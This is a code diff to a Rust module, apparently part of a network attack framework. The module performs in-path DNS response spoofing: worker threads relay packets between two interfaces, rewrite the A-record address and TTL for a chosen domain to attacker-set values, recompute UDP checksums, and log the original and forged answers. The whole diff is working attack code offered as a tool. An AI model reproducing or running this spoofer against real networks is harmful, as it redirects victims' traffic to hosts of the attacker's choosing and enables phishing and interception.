@@ -1,7 +1,7 @@
 use append_only_vec::AppendOnlyVec;
 use async_trait::async_trait;
 use axum::body::Bytes;
-use dns_message_parser::rr::RR;
+use dns_message_parser::rr::RR::{self, A};
 use dns_message_parser::Dns as DnsMessage;
 use pnet::packet::ipv4::{self, MutableIpv4Packet};
 use pnet::packet::udp::{self, MutableUdpPacket};
@@ -31,8 +31,9 @@ pub struct Dns {
     pub stop_channel: Option<Sender<bool>>,
     pub logging: bool,
     pub logs: Arc<AppendOnlyVec<DnsMessageLog>>,
-    pub domain_name: String,
-    pub ip_address: Ipv4Addr,
+    pub fqdn: String,
+    pub ipv4: Ipv4Addr,
+    pub ttl: u32,
 }
 
 impl Default for Dns {
@@ -43,8 +44,9 @@ impl Default for Dns {
             stop_channel: None,
             logs: Arc::new(AppendOnlyVec::<DnsMessageLog>::new()),
             logging: false,
-            domain_name: String::new(),
-            ip_address: Ipv4Addr::UNSPECIFIED,
+            fqdn: String::new(),
+            ipv4: Ipv4Addr::UNSPECIFIED,
+            ttl: 0,
         }
     }
 }
@@ -75,7 +77,12 @@ pub struct DnsQuestionLog {
     class: String,
 }
 #[derive(Serialize, Clone, Debug)]
-pub struct DnsAnswerLog {}
+pub struct DnsAnswerLog {
+    r#type: String,
+    fqdn: String,
+    ttl: (u32, u32),
+    ipv4: (Ipv4Addr, Ipv4Addr),
+}
 
 const INTERFACE_READ_TIMEOUT_MS: u64 = 1;
 
@@ -93,8 +100,9 @@ impl Attack for Dns {
                         mut tx_channel: Box<dyn DataLinkSender>,
                         mut stop_channel: Receiver<bool>,
                         logs: Option<Arc<AppendOnlyVec<DnsMessageLog>>>,
-                        domain: String,
-                        ip: Ipv4Addr| {
+                        fqdn: String,
+                        ipv4: Ipv4Addr,
+                        ttl: u32| {
             move || {
                 info!("Started DNS worker thread");
                 loop {
@@ -170,7 +178,7 @@ impl Attack for Dns {
                             .iter()
                             .filter(|answer| match answer {
                                 RR::A(a) => {
-                                    if a.domain_name.to_string() == domain {
+                                    if a.domain_name.to_string() == fqdn {
                                         true
                                     } else {
                                         false
@@ -187,18 +195,63 @@ impl Attack for Dns {
                             continue;
                         }
 
+                        // Log the modification
+                        if let Some(ref log_vec) = logs {
+                            let log = DnsMessageLog {
+                                // Ethernet
+                                eth_src_addr: rx_ethernet_frame.get_source().to_string(),
+                                eth_dest_addr: rx_ethernet_frame.get_destination().to_string(),
+                                // Ipv4
+                                ipv4_src_addr: rx_ipv4_packet.get_source().to_string(),
+                                ipv4_dest_addr: rx_ipv4_packet.get_destination().to_string(),
+                                // Udp
+                                udp_src_port: rx_udp_packet.get_source(),
+                                udp_dest_port: rx_udp_packet.get_destination(),
+                                // Dns
+                                dns_qr: rx_dns_message.flags.qr,
+                                dns_aa: rx_dns_message.flags.aa,
+                                dns_ra: rx_dns_message.flags.ra,
+                                dns_rd: rx_dns_message.flags.rd,
+                                dns_questions: rx_dns_message
+                                    .questions
+                                    .iter()
+                                    .map(|q| DnsQuestionLog {
+                                        name: q.domain_name.to_string(),
+                                        r#type: q.q_type.to_string(),
+                                        class: q.q_class.to_string(),
+                                    })
+                                    .collect(),
+                                dns_answers: rx_dns_message
+                                    .answers
+                                    .iter()
+                                    .filter_map(|rr| match rr {
+                                        A(a) => Some(DnsAnswerLog {
+                                            r#type: String::from("A"),
+                                            fqdn: a.domain_name.to_string(),
+                                            ttl: (a.ttl, ttl),
+                                            ipv4: (a.ipv4_addr, ipv4),
+                                        }),
+                                        _ => None,
+                                    })
+                                    .collect(),
+                            };
+                            debug!("Logged {:?}", log);
+                            log_vec.push(log);
+                        }
+
                         // Perform modification
                         rx_dns_message
                             .answers
                             .iter_mut()
                             .map(|answer| {
                                 if let RR::A(a) = answer {
-                                    if a.domain_name.to_string() == domain {
+                                    if a.domain_name.to_string() == fqdn {
                                         info!(
-                                            "Modified resolved IP for domain {} from {} to {}",
-                                            domain, a.ipv4_addr, ip
+                                            "Modified domain {} resolved IP from {} to {} and ttl from {} to {}",
+                                            fqdn, a.ipv4_addr, ipv4, a.ttl, ttl
                                         );
-                                        a.ipv4_addr = ip
+                                        a.ipv4_addr = ipv4;
+                                        a.ttl = ttl;
                                     }
                                 }
                             })
@@ -227,9 +280,9 @@ impl Attack for Dns {
                                 // Udp
                                 let mut tx_udp_packet =
                                     MutableUdpPacket::new(tx_ipv4_packet.payload_mut()).unwrap();
-                                let tx_dns_packet = rx_dns_message.encode().unwrap();
+                                let tx_dns_message = rx_dns_message.encode().unwrap();
                                 tx_udp_packet.clone_from(&rx_udp_packet);
-                                tx_udp_packet.set_payload(&tx_dns_packet);
+                                tx_udp_packet.set_payload(&tx_dns_message);
                                 tx_udp_packet.set_checksum(udp::ipv4_checksum(
                                     &tx_udp_packet.to_immutable(),
                                     &source_ip,
@@ -237,30 +290,6 @@ impl Attack for Dns {
                                 ));
                             },
                         );
-
-                        // Log the modification
-                        if let Some(ref log_vec) = logs {
-                            let log = DnsMessageLog {
-                                // Ethernet
-                                eth_src_addr: rx_ethernet_frame.get_source().to_string(),
-                                eth_dest_addr: rx_ethernet_frame.get_destination().to_string(),
-                                // Ipv4
-                                ipv4_src_addr: rx_ipv4_packet.get_source().to_string(),
-                                ipv4_dest_addr: rx_ipv4_packet.get_destination().to_string(),
-                                // Udp
-                                udp_src_port: rx_udp_packet.get_source(),
-                                udp_dest_port: rx_udp_packet.get_destination(),
-                                // Dns
-                                dns_qr: rx_dns_message.flags.qr,
-                                dns_aa: rx_dns_message.flags.aa,
-                                dns_ra: rx_dns_message.flags.ra,
-                                dns_rd: rx_dns_message.flags.rd,
-                                dns_questions: vec![],
-                                dns_answers: vec![],
-                            };
-                            debug!("Logged {:?}", log);
-                            log_vec.push(log);
-                        }
                     }
                 }
             }
@@ -315,16 +344,18 @@ impl Attack for Dns {
             tx_channel2,
             rx_stop_channel1,
             thread1_logs,
-            self.domain_name.clone(),
-            self.ip_address.clone(),
+            self.fqdn.clone(),
+            self.ipv4.clone(),
+            self.ttl,
         ));
         spawn_blocking(modifier(
             rx_channel2,
             tx_channel1,
             rx_stop_channel2,
             thread2_logs,
-            self.domain_name.clone(),
-            self.ip_address.clone(),
+            self.fqdn.clone(),
+            self.ipv4.clone(),
+            self.ttl,
         ));
         ()
     }
